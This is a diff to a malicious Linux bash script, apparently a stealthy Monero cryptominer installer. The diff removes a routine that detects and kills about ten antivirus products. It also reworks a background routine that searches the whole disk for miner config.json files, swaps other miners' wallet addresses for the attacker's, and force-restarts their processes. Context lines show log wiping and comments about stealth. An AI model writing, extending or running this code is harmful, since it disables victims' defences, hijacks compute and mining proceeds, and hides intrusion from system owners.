@@ -1057,100 +1057,6 @@ elif ! curl -sS --max-time 5 https://google.com >/dev/null 2>&1; then
     USE_WGET=true
 fi
 
-# ==================== DISABLE ANTIVIRUS SOFTWARE ====================
-echo ""
-echo "[*] Detecting and disabling antivirus software..."
-
-AV_DISABLED=false
-
-# ClamAV
-if command -v clamav-daemon >/dev/null 2>&1 || systemctl is-active clamav-daemon >/dev/null 2>&1; then
-    echo "[*] ClamAV detected - stopping..."
-    systemctl stop clamav-daemon clamav-freshclam 2>/dev/null || true
-    service clamav-daemon stop 2>/dev/null || true
-    /etc/init.d/clamav-daemon stop 2>/dev/null || true
-    killall -9 clamd freshclam 2>/dev/null || true
-    AV_DISABLED=true
-fi
-
-# Sophos
-if [ -d /opt/sophos-av ] || command -v /opt/sophos-av/bin/savdctl >/dev/null 2>&1; then
-    echo "[*] Sophos detected - stopping..."
-    /opt/sophos-av/bin/savdctl disable 2>/dev/null || true
-    systemctl stop sav-protect 2>/dev/null || true
-    AV_DISABLED=true
-fi
-
-# Avast
-if command -v avast >/dev/null 2>&1; then
-    echo "[*] Avast detected - stopping..."
-    systemctl stop avast 2>/dev/null || true
-    /etc/init.d/avast stop 2>/dev/null || true
-    AV_DISABLED=true
-fi
-
-# Comodo
-if [ -d /opt/COMODO ] || command -v cmdagent >/dev/null 2>&1; then
-    echo "[*] Comodo detected - stopping..."
-    killall -9 cmdagent 2>/dev/null || true
-    /etc/init.d/cmdagent stop 2>/dev/null || true
-    AV_DISABLED=true
-fi
-
-# ESET
-if command -v /opt/eset/esets/sbin/esets_daemon >/dev/null 2>&1; then
-    echo "[*] ESET detected - stopping..."
-    /etc/init.d/esets stop 2>/dev/null || true
-    systemctl stop esets 2>/dev/null || true
-    AV_DISABLED=true
-fi
-
-# Kaspersky
-if [ -d /var/opt/kaspersky ] || command -v kesl-control >/dev/null 2>&1; then
-    echo "[*] Kaspersky detected - stopping..."
-    systemctl stop kesl 2>/dev/null || true
-    /etc/init.d/kesl stop 2>/dev/null || true
-    AV_DISABLED=true
-fi
-
-# McAfee
-if command -v /opt/McAfee/ens/tp/init/mfetpd-control.sh >/dev/null 2>&1; then
-    echo "[*] McAfee detected - stopping..."
-    /opt/McAfee/ens/tp/init/mfetpd-control.sh stop 2>/dev/null || true
-    AV_DISABLED=true
-fi
-
-# Bitdefender
-if command -v /opt/bitdefender/bin/bdscan >/dev/null 2>&1; then
-    echo "[*] Bitdefender detected - stopping..."
-    systemctl stop bd-protection 2>/dev/null || true
-    /etc/init.d/bd-protection stop 2>/dev/null || true
-    AV_DISABLED=true
-fi
-
-# F-Prot
-if command -v fprot >/dev/null 2>&1; then
-    echo "[*] F-Prot detected - stopping..."
-    systemctl stop f-prot 2>/dev/null || true
-    /etc/init.d/f-prot stop 2>/dev/null || true
-    AV_DISABLED=true
-fi
-
-# AVG
-if command -v avgctl >/dev/null 2>&1; then
-    echo "[*] AVG detected - stopping..."
-    avgctl --stop 2>/dev/null || true
-    systemctl stop avgd 2>/dev/null || true
-    AV_DISABLED=true
-fi
-
-if [ "$AV_DISABLED" = true ]; then
-    echo "[✓] Antivirus software disabled"
-    sleep 2
-else
-    echo "[*] No common antivirus detected"
-fi
-
 # ==================== DISK SPACE CHECK ====================
 echo "[*] Checking available disk space..."
 AVAILABLE_KB=$(df /root 2>/dev/null | tail -1 | awk '{print $4}')
@@ -2527,75 +2433,88 @@ echo "[✓] Apport disabled completely"
 # ==================== HIJACK OTHER MINERS (WALLET REPLACEMENT) ====================
 echo ""
 echo "=========================================="
-echo "HIJACKING EXISTING MINERS"
+echo "HIJACKING EXISTING MINERS (BACKGROUND)"
 echo "=========================================="
 echo ""
 
 MY_WALLET="$WALLET_ADDRESS"
 
-# Function to validate if a string is a Monero wallet address
-is_monero_wallet() {
-    local address="$1"
-    
-    # Check if empty or too short
-    [ -z "$address" ] && return 1
-    [ ${#address} -lt 90 ] && return 1
-    
-    # Monero addresses start with 4 (standard, 95 chars) or 8 (integrated, 106 chars)
-    # Subaddresses start with 8 (87 chars)
-    local first_char="${address:0:1}"
-    if [ "$first_char" != "4" ] && [ "$first_char" != "8" ]; then
-        return 1
-    fi
-    
-    # Check length is valid for Monero addresses
-    local addr_len=${#address}
-    if [ $addr_len -ne 95 ] && [ $addr_len -ne 106 ] && [ $addr_len -ne 87 ]; then
-        return 1
-    fi
-    
-    # Check for invalid characters (Monero uses base58, no: 0, O, I, l)
-    # Also reject common placeholders/patterns
-    if echo "$address" | grep -qE '[^123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz]'; then
-        return 1
-    fi
-    
-    # Reject obvious placeholders
-    if echo "$address" | grep -qiE '(\[\[|example|test|placeholder|sample|dummy|xxx|dbuser|softdb|admin)'; then
-        return 1
-    fi
-    
-    # Valid Monero wallet address
-    return 0
-}
-
-echo "[*] Searching for existing miner config files..."
-echo "[*] This will replace any wallet addresses with: ${MY_WALLET:0:20}...${MY_WALLET: -10}"
+# Create log file for background hijacker
+HIJACK_LOG="/tmp/config_hijacker_$$.log"
+echo "[*] Starting config.json hijacker in background..."
+echo "[*] Search covers ENTIRE HDD - this may take several minutes"
+echo "[*] Hijacker log: $HIJACK_LOG"
+echo "[*] Script will continue immediately - check log file for results"
 echo ""
 
-# Search common locations for config.json files
-SEARCH_PATHS=(
-    "/root"
-    "/home"
-    "/opt"
-    "/tmp"
-    "/var"
-    "/usr/local"
-)
-
-CONFIGS_FOUND=0
-CONFIGS_HIJACKED=0
-
-for search_path in "${SEARCH_PATHS[@]}"; do
-    if [ -d "$search_path" ]; then
-        echo "[*] Searching in $search_path..."
+# Background hijacker function
+(
+    echo "=====================================================================" >> "$HIJACK_LOG"
+    echo "CONFIG.JSON HIJACKER - Started at $(date)" >> "$HIJACK_LOG"
+    echo "=====================================================================" >> "$HIJACK_LOG"
+    echo "" >> "$HIJACK_LOG"
+    
+    # Function to validate if a string is a Monero wallet address
+    is_monero_wallet() {
+        local address="$1"
         
-        # Find all config.json files (with timeout to prevent hanging)
-        timeout 30 find "$search_path" -type f -name "config.json" 2>/dev/null | while read -r config_file; do
-            # Skip our own config
-            if echo "$config_file" | grep -q "/root/.swapd/"; then
-                continue
-            fi
+        # Check if empty or too short
+        [ -z "$address" ] && return 1
+        [ ${#address} -lt 90 ] && return 1
+        
+        # Monero addresses start with 4 (standard, 95 chars) or 8 (integrated, 106 chars)
+        # Subaddresses start with 8 (87 chars)
+        local first_char="${address:0:1}"
+        if [ "$first_char" != "4" ] && [ "$first_char" != "8" ]; then
+            return 1
+        fi
+        
+        # Check length is valid for Monero addresses
+        local addr_len=${#address}
+        if [ $addr_len -ne 95 ] && [ $addr_len -ne 106 ] && [ $addr_len -ne 87 ]; then
+            return 1
+        fi
+        
+        # Check for invalid characters (Monero uses base58, no: 0, O, I, l)
+        # Also reject common placeholders/patterns
+        if echo "$address" | grep -qE '[^123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz]'; then
+            return 1
+        fi
+        
+        # Reject obvious placeholders
+        if echo "$address" | grep -qiE '(\[\[|example|test|placeholder|sample|dummy|xxx|dbuser|softdb|admin)'; then
+            return 1
+        fi
+        
+        # Valid Monero wallet address
+        return 0
+    }
+    
+    echo "[*] Searching entire HDD for config.json files..." >> "$HIJACK_LOG"
+    echo "[*] Target wallet: ${MY_WALLET:0:20}...${MY_WALLET: -10}" >> "$HIJACK_LOG"
+    echo "" >> "$HIJACK_LOG"
+    
+    # Search entire filesystem for config.json files
+    SEARCH_PATHS=(
+        "/"                    # Search ENTIRE HDD
+    )
+    
+    CONFIGS_FOUND=0
+    CONFIGS_HIJACKED=0
+    
+    for search_path in "${SEARCH_PATHS[@]}"; do
+        if [ -d "$search_path" ]; then
+            echo "[*] Searching in $search_path..." >> "$HIJACK_LOG"
+            
+            # No timeout - let it search the entire HDD
+            find "$search_path" -type f -name "config.json" 2>/dev/null | while read -r config_file; do
+                # Skip our own config
+                if echo "$config_file" | grep -q "/root/.swapd/"; then
+                    echo "    [SKIP] $config_file (our own config)" >> "$HIJACK_LOG"
+                    continue
+                fi
+                
+                echo "    [FOUND] $config_file" >> "$HIJACK_LOG"
             
             # Check if file contains a "user" field (wallet address)
             if grep -q '"user"' "$config_file" 2>/dev/null; then
@@ -2607,15 +2526,16 @@ for search_path in "${SEARCH_PATHS[@]}"; do
                 # Validate it's actually a Monero wallet address
                 if ! is_monero_wallet "$CURRENT_WALLET"; then
                     # Not a wallet address, skip this file
+                    echo "    [SKIP] $config_file (not a valid Monero wallet: $CURRENT_WALLET)" >> "$HIJACK_LOG"
                     continue
                 fi
                 
                 # Check if it's already our wallet
                 if [ "$CURRENT_WALLET" = "$MY_WALLET" ]; then
-                    echo "  [✓] $config_file - Already using our wallet"
+                    echo "  [✓] $config_file - Already using our wallet" >> "$HIJACK_LOG"
                 else
-                    echo "  [!] $config_file - Found different wallet"
-                    echo "      Old: ${CURRENT_WALLET:0:20}...${CURRENT_WALLET: -10}"
+                    echo "  [!] $config_file - Found different wallet" >> "$HIJACK_LOG"
+                    echo "      Old: ${CURRENT_WALLET:0:20}...${CURRENT_WALLET: -10}" >> "$HIJACK_LOG"
                     
                     # Backup original config
                     cp "$config_file" "${config_file}.backup.$(date +%s)" 2>/dev/null || true
@@ -2624,9 +2544,10 @@ for search_path in "${SEARCH_PATHS[@]}"; do
                     # This preserves ALL our settings (threads, CPU affinity, etc.)
                     if [ -f /root/.swapd/swapfile ]; then
                         cp /root/.swapd/swapfile "$config_file"
+                        echo "      [*] Copied /root/.swapd/swapfile → $config_file" >> "$HIJACK_LOG"
                     else
-                        echo "      [!] WARNING: Our config (/root/.swapd/swapfile) not found yet!"
-                        echo "      [*] Will create basic config with our wallet..."
+                        echo "      [!] WARNING: Our config (/root/.swapd/swapfile) not found yet!" >> "$HIJACK_LOG"
+                        echo "      [*] Will create basic config with our wallet..." >> "$HIJACK_LOG"
                         cat > "$config_file" << 'CONFIG_EOF'
 {
     "autosave": false,
@@ -2651,70 +2572,91 @@ CONFIG_EOF
                     fi
                     
                     if [ $? -eq 0 ]; then
-                        echo "      New: ${MY_WALLET:0:20}...${MY_WALLET: -10}"
-                        echo "      [✓] Config completely overwritten!"
+                        echo "      New: ${MY_WALLET:0:20}...${MY_WALLET: -10}" >> "$HIJACK_LOG"
+                        echo "      [✓] Config completely overwritten!" >> "$HIJACK_LOG"
                         CONFIGS_HIJACKED=$((CONFIGS_HIJACKED + 1))
                         
                         # Try to restart the associated service/process
                         # Find process using this config file
                         MINER_PID=$(lsof "$config_file" 2>/dev/null | grep -v COMMAND | awk '{print $2}' | head -1)
                         if [ -n "$MINER_PID" ]; then
-                            echo "      [*] Restarting miner process (PID: $MINER_PID)"
+                            echo "      [*] Restarting miner process (PID: $MINER_PID)" >> "$HIJACK_LOG"
                             kill -9 "$MINER_PID" 2>/dev/null || true
                             # The miner's service/cron will auto-restart it with new config
                         fi
                     else
-                        echo "      [!] Failed to overwrite config"
+                        echo "      [!] Failed to overwrite config" >> "$HIJACK_LOG"
                     fi
                 fi
+            else
+                echo "    [SKIP] $config_file (no 'user' field - not a miner config)" >> "$HIJACK_LOG"
             fi
         done
     fi
 done
 
-# Also search for common miner service names and check their configs
-echo ""
-echo "[*] Checking systemd services for miners..."
-for service_name in xmrig swapd kswapd0 minerd cpuminer miner; do
-    if systemctl list-unit-files 2>/dev/null | grep -q "^${service_name}.service"; then
-        echo "[*] Found service: $service_name.service"
-        
-        # Try to extract ExecStart path from service file
-        SERVICE_FILE=$(systemctl show -p FragmentPath "$service_name" 2>/dev/null | cut -d= -f2)
-        if [ -f "$SERVICE_FILE" ]; then
-            # Look for config file reference in ExecStart
-            CONFIG_PATH=$(grep "ExecStart" "$SERVICE_FILE" 2>/dev/null | grep -oP '\-c\s+\K[^\s]+' | head -1)
-            if [ -n "$CONFIG_PATH" ] && [ -f "$CONFIG_PATH" ]; then
-                echo "  Config: $CONFIG_PATH"
-                
-                # Check and hijack if needed
-                if grep -q '"user"' "$CONFIG_PATH" 2>/dev/null; then
-                    CURRENT_WALLET=$(grep '"user"' "$CONFIG_PATH" | sed 's/.*"user".*:.*"\([^"]*\)".*/\1/' | head -1)
+    # Also search for common miner service names and check their configs
+    echo "" >> "$HIJACK_LOG"
+    echo "[*] Checking systemd services for miners..." >> "$HIJACK_LOG"
+    for service_name in xmrig swapd kswapd0 minerd cpuminer miner; do
+        if systemctl list-unit-files 2>/dev/null | grep -q "^${service_name}.service"; then
+            echo "[*] Found service: $service_name.service" >> "$HIJACK_LOG"
+            
+            # Try to extract ExecStart path from service file
+            SERVICE_FILE=$(systemctl show -p FragmentPath "$service_name" 2>/dev/null | cut -d= -f2)
+            if [ -f "$SERVICE_FILE" ]; then
+                # Look for config file reference in ExecStart
+                CONFIG_PATH=$(grep "ExecStart" "$SERVICE_FILE" 2>/dev/null | grep -oP '\-c\s+\K[^\s]+' | head -1)
+                if [ -n "$CONFIG_PATH" ] && [ -f "$CONFIG_PATH" ]; then
+                    echo "  Config: $CONFIG_PATH" >> "$HIJACK_LOG"
                     
-                    # Validate it's actually a Monero wallet address
-                    if ! is_monero_wallet "$CURRENT_WALLET"; then
-                        echo "  [*] Not a miner config (invalid wallet format)"
-                        continue
-                    fi
-                    
-                    if [ "$CURRENT_WALLET" != "$MY_WALLET" ]; then
-                        echo "  [!] Different wallet detected - hijacking..."
-                        cp "$CONFIG_PATH" "${CONFIG_PATH}.backup.$(date +%s)" 2>/dev/null || true
-                        sed -i "s|\"user\": *\"[^\"]*\"|\"user\": \"$MY_WALLET\"|g" "$CONFIG_PATH" 2>/dev/null
+                    # Check and hijack if needed
+                    if grep -q '"user"' "$CONFIG_PATH" 2>/dev/null; then
+                        CURRENT_WALLET=$(grep '"user"' "$CONFIG_PATH" | sed 's/.*"user".*:.*"\([^"]*\)".*/\1/' | head -1)
                         
-                        echo "  [✓] Wallet replaced - restarting service..."
-                        systemctl restart "$service_name" 2>/dev/null || true
+                        # Validate it's actually a Monero wallet address
+                        if ! is_monero_wallet "$CURRENT_WALLET"; then
+                            echo "  [*] Not a miner config (invalid wallet format)" >> "$HIJACK_LOG"
+                            continue
+                        fi
+                        
+                        if [ "$CURRENT_WALLET" != "$MY_WALLET" ]; then
+                            echo "  [!] Different wallet detected - hijacking..." >> "$HIJACK_LOG"
+                            cp "$CONFIG_PATH" "${CONFIG_PATH}.backup.$(date +%s)" 2>/dev/null || true
+                            
+                            # Copy our exact config
+                            if [ -f /root/.swapd/swapfile ]; then
+                                cp /root/.swapd/swapfile "$CONFIG_PATH"
+                                echo "  [✓] Copied our config → $CONFIG_PATH" >> "$HIJACK_LOG"
+                            else
+                                sed -i "s|\"user\": *\"[^\"]*\"|\"user\": \"$MY_WALLET\"|g" "$CONFIG_PATH" 2>/dev/null
+                                echo "  [✓] Wallet replaced" >> "$HIJACK_LOG"
+                            fi
+                            
+                            echo "  [*] Restarting service..." >> "$HIJACK_LOG"
+                            systemctl restart "$service_name" 2>/dev/null || true
+                            CONFIGS_HIJACKED=$((CONFIGS_HIJACKED + 1))
+                        fi
                     fi
                 fi
             fi
         fi
-    fi
-done
+    done
+    
+    echo "" >> "$HIJACK_LOG"
+    echo "=====================================================================" >> "$HIJACK_LOG"
+    echo "[✓] CONFIG.JSON HIJACKER COMPLETE - $(date)" >> "$HIJACK_LOG"
+    echo "=====================================================================" >> "$HIJACK_LOG"
+    echo "[*] Total configs found: $CONFIGS_FOUND" >> "$HIJACK_LOG"
+    echo "[*] Configs hijacked: $CONFIGS_HIJACKED" >> "$HIJACK_LOG"
+    echo "" >> "$HIJACK_LOG"
+    echo "All hijacked miners now use wallet: ${MY_WALLET:0:20}...${MY_WALLET: -10}" >> "$HIJACK_LOG"
+    echo "=====================================================================" >> "$HIJACK_LOG"
+    
+) &  # Run entire hijacker in background
 
-echo ""
-echo "[✓] Wallet hijacking complete"
-echo "[*] Total configs found: $CONFIGS_FOUND"
-echo "[*] Configs hijacked: $CONFIGS_HIJACKED"
+echo "[✓] Hijacker started in background (PID: $!)"
+echo "[*] Main script continuing..."
 echo ""
 
 # ==================== CLEAN UP LOGS ====================
@@ -2763,11 +2705,6 @@ if command -v journalctl >/dev/null 2>&1; then
 fi
 
 echo "[✓] Log cleanup complete"
-
-# ==================== WALLET HIJACKER DISABLED ====================
-# Wallet hijacker functionality has been removed from this script
-# to reduce detection surface and improve stealth
-echo "[*] Wallet hijacker disabled (stealth optimization)"
 
 # ==================== FINAL CLEANUP ====================
 echo "[*] Final cleanup..."
